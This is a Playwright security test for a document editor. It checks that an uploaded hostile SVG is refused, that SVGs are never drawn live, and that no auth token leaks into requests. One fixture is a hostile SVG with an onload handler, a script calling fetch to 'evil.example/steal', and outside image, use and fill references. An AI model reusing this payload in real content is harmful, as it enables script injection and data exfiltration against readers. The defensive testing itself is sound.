/**
 * SEC-006 criterion 4 and SEC-007 criterion 2 through the element, against the real wire service
 * with the asset worker in process (unsandboxed, for tests only), memory storage.
 *
 * The document holds two inline pictures that were uploaded through the service's own route
 * (`POST /documents/{id}/assets`, the quarantine, `POST /assets/{id}/complete`, the worker):
 *
 * - a PNG, which the service resolves to a signed URL on the asset origin and the element draws;
 * - a drawing in SVG that carries a stylesheet, a link, metadata and a reference to an outside
 *   host. The worker redraws it as a flat drawing; the service resolves it with the type
 *   `image/svg+xml`; the element never draws an SVG, so the node keeps its placeholder.
 *
 * A second SVG with a script, an event handler, an outside image, an outside `use`, a foreign
 * object and an outside fill is uploaded too. The worker refuses it (`unsafe_content`), so it is
 * never ready, gets no URL and cannot be put in a document.
 *
 * Over the session the page's request log is read: every request address and body, every WebSocket
 * address, the console and the page errors. No token is in any of them (SEC-007), and no request
 * goes to a host other than the page, the service and the asset origin, and none to the outside
 * host the SVGs name (SEC-006). The asset addresses in that log are the service's resolve route
 * and the signed picture URL; the export addresses are the element's own `requestExport`.
 *
 * Run from the repository root with
 * `DOCEDIT_DEMO_PORT=57210 pnpm exec playwright test -c packages/element/playwright.config.ts packages/element/e2e/sec-006-007-assets.spec.ts`
 * in Chromium, Firefox and WebKit.
 */
import { randomBytes } from 'node:crypto';
import { expect, test } from '@playwright/test';
import { startHarness } from '../../../tests/security/test/support/harness.ts';
import { unsandboxed } from '../../../services/asset-worker/src/index.ts';
import { SVG_OK } from '../../../services/asset-worker/test/fixtures.ts';
import { openEmbed } from './embed-helpers.ts';

const DEMO_PORT = Number(process.env['DOCEDIT_DEMO_PORT'] ?? 4791);
const ORIGIN = `http://127.0.0.1:${DEMO_PORT}`;
const ASSET_ORIGIN = 'https://assets.tests.example';
const OUTSIDE = 'evil.example';
const NAME = 'sec-006-007-assets';

/** A one-pixel PNG. */
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64',
);

/** The drawing a reader may be sent: junk the worker removes, and an outside link it drops. */
const SVG_WITH_JUNK = SVG_OK.replace(
  '</svg>',
  `<a href="https://${OUTSIDE}/click"><rect width="4" height="4"/></a></svg>`,
);

/** Everything an SVG can do that it must not: script, handler, outside loads, foreign content. */
const SVG_HOSTILE = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40" onload="window.__canary='onload'">
<script>window.__canary='script'; fetch('https://${OUTSIDE}/steal')</script>
<image href="https://${OUTSIDE}/track.png" width="10" height="10"/>
<use xlink:href="https://${OUTSIDE}/sprite.svg#a"/>
<foreignObject width="5" height="5"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>
<rect width="5" height="5" style="fill: url(https://${OUTSIDE}/p)"/>
</svg>`;

test('SEC-006 and SEC-007: an uploaded SVG is never drawn live and no token reaches any asset, export or socket address', async ({
  page,
}) => {
  test.setTimeout(150_000);
  const h = await startHarness('memory', {
    port: 0,
    jobHandlers: {
      export: async (_job, ctx) => {
        await ctx.report('converting', 10);
        return { output: 'output.pdf', pages: 1 };
      },
    },
    assetWorker: { sandbox: unsandboxed(), allowUnsandboxed: true },
    env: {
      DOCEDIT_ASSET_ORIGIN: ASSET_ORIGIN,
      DOCEDIT_ASSET_URL_KEY: `k1:${randomBytes(32).toString('base64')}`,
    },
  });
  try {
    await h.parts.registry.addOrigin(h.a.id, ORIGIN);
    const docId = await h.createDocument(h.a);
    const owner = h.userToken(h.a, 'ada', { [docId]: 'owner' });

    /** Uploads `bytes` as the browser would send them and waits until the worker has settled it. */
    async function upload(filename: string, mime: string, bytes: Uint8Array) {
      const declared = await h.call('POST', `/v1/documents/${docId}/assets`, {
        token: owner,
        body: { filename, mime, size: bytes.length },
      });
      expect(declared.status, declared.text).toBe(201);
      const id = (declared.json as { asset: string }).asset;
      await h.service.assets.putQuarantined(h.a.id, id, bytes);
      const done = await h.call('POST', `/v1/assets/${id}/complete`, { token: owner });
      expect(done.status, done.text).toBe(202);
      for (let i = 0; i < 1500; i++) {
        const row = await h.parts.assetRegistry.get(h.a.id, id);
        if (row?.state === 'ready' || row?.state === 'failed') return { id, row };
        await new Promise((r) => setTimeout(r, 20));
      }
      throw new Error('the asset was not settled');
    }

    const png = await upload('dot.png', 'image/png', PNG);
    expect(png.row.state).toBe('ready');
    const svg = await upload('drawing.svg', 'image/svg+xml', Buffer.from(SVG_WITH_JUNK));
    expect(svg.row.state, JSON.stringify(svg.row)).toBe('ready');
    const hostile = await upload('hostile.svg', 'image/svg+xml', Buffer.from(SVG_HOSTILE));
    expect(hostile.row.state, 'the worker refuses the hostile drawing').toBe('failed');
    expect(JSON.stringify(hostile.row)).toContain('unsafe_content');

    // The service: the hostile drawing gets no URL, and a document cannot name it.
    const resolved = await h.call('POST', `/v1/documents/${docId}/assets/resolve`, {
      token: owner,
      body: { assets: [png.id, svg.id, hostile.id] },
    });
    expect(resolved.status, resolved.text).toBe(200);
    const answers = (
      resolved.json as { assets: { asset: string; url: string; contentType: string }[] }
    ).assets;
    expect(answers.map((a) => a.asset).sort()).toEqual([png.id, svg.id].sort());
    expect(answers.find((a) => a.asset === svg.id)?.contentType).toBe('image/svg+xml');
    expect(answers.find((a) => a.asset === png.id)?.contentType).toBe('image/png');

    // The two ready pictures go into the first paragraph of the body.
    type Node = { type: string; attrs?: unknown; content?: Node[] };
    const head = await h.call('GET', `/v1/documents/${docId}/content`, { token: h.a.apiKey });
    const {
      incarnation: _i,
      seq: _s,
      view: _v,
      ...envelope
    } = head.json as { doc: Node; incarnation: unknown; seq: unknown; view: unknown };
    const image = (asset: string, alt: string): Node => ({
      type: 'image',
      attrs: { asset, width: 40, height: 40, alt },
    });
    const paragraph = envelope.doc.content!.find((n) => n.type === 'body')!.content![0]!;
    paragraph.content = [image(png.id, 'A dot'), image(svg.id, 'A drawing')];
    const put = await h.call('PUT', `/v1/documents/${docId}/content`, {
      token: h.a.apiKey,
      body: envelope,
      headers: { 'If-Match': head.headers.get('etag') ?? '' },
    });
    expect(put.status, put.text).toBe(204);
    // A document cannot name the drawing the worker refused.
    paragraph.content.push(image(hostile.id, 'Hostile'));
    const named = await h.call('PUT', `/v1/documents/${docId}/content`, {
      token: h.a.apiKey,
      body: envelope,
      headers: {
        'If-Match': (
          await h.call('GET', `/v1/documents/${docId}/content`, { token: h.a.apiKey })
        ).headers.get('etag')!,
      },
    });
    expect(named.status, named.text).toBeGreaterThanOrEqual(400);

    const token = h.userToken(h.a, 'ada', { [docId]: 'editor' });
    const [tokenHead, tokenBody, signature] = token.split('.') as [string, string, string];
    const needles = [token, tokenHead, tokenBody, signature, signature.slice(-40)];
    const clean = (text: string, where: string): void => {
      for (const n of needles) expect(text, `${where} holds no token`).not.toContain(n);
      expect(text, `${where} holds nothing shaped like a signed token`).not.toMatch(
        /eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}/,
      );
    };

    const addresses: string[] = [];
    const seen: string[] = [];
    const hosts = new Set<string>();
    page.on('request', (r) => {
      addresses.push(`${r.method()} ${r.url()}`);
      seen.push(r.url());
      const body = r.postData();
      if (body) seen.push(body);
      const u = new URL(r.url());
      if (u.protocol === 'http:' || u.protocol === 'https:') hosts.add(u.host);
    });
    page.on('websocket', (ws) => {
      addresses.push(`WS ${ws.url()}`);
      seen.push(ws.url());
    });
    const consoleLines: string[] = [];
    page.on('console', (m) => consoleLines.push(m.text()));
    page.on('pageerror', (err) => consoleLines.push(err.message));
    // The asset origin does not exist; the picture is answered here, so the request is the one a
    // reader's browser would make and its address is in the log.
    await page.route(`${ASSET_ORIGIN}/**`, (route) =>
      route.fulfill({ status: 200, contentType: 'image/png', body: PNG }),
    );

    await openEmbed(page);
    await page.evaluate(
      async ({ endpoint, docId, token, name }) => {
        const el = document.createElement('doc-editor') as HTMLElement & Record<string, unknown>;
        el.dataset['test'] = name;
        el.setAttribute('endpoint', endpoint);
        el.setAttribute('doc-id', docId);
        el['getToken'] = async () => token;
        const ready = new Promise<void>((resolve, reject) => {
          el.addEventListener('de-ready', () => resolve(), { once: true });
          el.addEventListener(
            'de-error',
            (ev) => reject(new Error(JSON.stringify((ev as CustomEvent).detail))),
            { once: true },
          );
        });
        document.getElementById('mount')!.append(el);
        await ready;
      },
      { endpoint: h.base, docId, token, name: NAME },
    );

    const root = `doc-editor[data-test="${NAME}"]`;
    // The PNG is drawn from its signed URL on the asset origin.
    await expect
      .poll(
        () =>
          page.evaluate((sel) => {
            const host = document.querySelector(sel);
            return Array.from(host?.shadowRoot?.querySelectorAll('.de-image img') ?? []).map(
              (img) => img.getAttribute('src') ?? '',
            );
          }, root),
        { timeout: 20_000 },
      )
      .toEqual([expect.stringMatching(/^https:\/\/assets\.tests\.example\//)]);

    // The SVG keeps its placeholder: no live SVG and nothing that can load one.
    const surface = await page.evaluate((sel) => {
      const shadow = document.querySelector(sel)!.shadowRoot!.querySelector('.de-editing-surface')!;
      const count = (q: string) => shadow.querySelectorAll(q).length;
      return {
        placeholders: count('.de-image'),
        pictures: count('.de-image img'),
        live: count('svg, object, embed, iframe, use, foreignObject, script'),
        svgSources: Array.from(shadow.querySelectorAll('img'))
          .map((img) => img.getAttribute('src') ?? '')
          .filter((src) => /svg/i.test(src)),
        canary: (window as unknown as { __canary?: unknown }).__canary ?? null,
      };
    }, root);
    expect(surface.placeholders).toBe(2);
    expect(surface.pictures, 'only the PNG is drawn').toBe(1);
    expect(surface.live).toBe(0);
    expect(surface.svgSources).toEqual([]);
    expect(surface.canary).toBeNull();

    // An export, asked for by the element itself.
    const jobId = await page.evaluate(async (sel) => {
      const el = document.querySelector(sel) as HTMLElement & {
        flush(): Promise<void>;
        requestExport(o: unknown): Promise<{ jobId: string }>;
      };
      await el.flush();
      return (await el.requestExport({ target: 'pdf', options: { profile: 'final' } })).jobId;
    }, root);
    await expect
      .poll(() => addresses.some((a) => a === `GET ${h.base}/v1/exports/${jobId}`), {
        timeout: 15_000,
      })
      .toBe(true);

    // The addresses the criterion names were all produced by the element.
    expect(addresses.some((a) => a.startsWith('WS ws'))).toBe(true);
    expect(addresses).toContain(`POST ${h.base}/v1/documents/${docId}/assets/resolve`);
    expect(addresses).toContain(`POST ${h.base}/v1/documents/${docId}/exports`);
    const read = addresses.filter((a) => a.startsWith(`GET ${ASSET_ORIGIN}/`));
    expect(read.length, 'the picture was requested from its signed URL').toBeGreaterThan(0);
    for (const a of read)
      expect(a, 'only the PNG is requested').not.toMatch(new RegExp(`${svg.id}|${hostile.id}`));

    // SEC-006: no request to the host the drawings name, and none to any host but the three.
    expect(hosts.has(OUTSIDE)).toBe(false);
    const allowed = new Set([new URL(ORIGIN).host, new URL(h.base).host, 'assets.tests.example']);
    expect([...hosts].filter((host) => !allowed.has(host))).toEqual([]);

    // SEC-007: no token in any address, body, console line or the signed URLs.
    for (const text of seen) clean(text, `request ${text.slice(0, 80)}`);
    for (const line of consoleLines) clean(line, `console line ${line.slice(0, 80)}`);
    expect(seen.length).toBeGreaterThan(5);
  } finally {
    await h.close();
  }
});
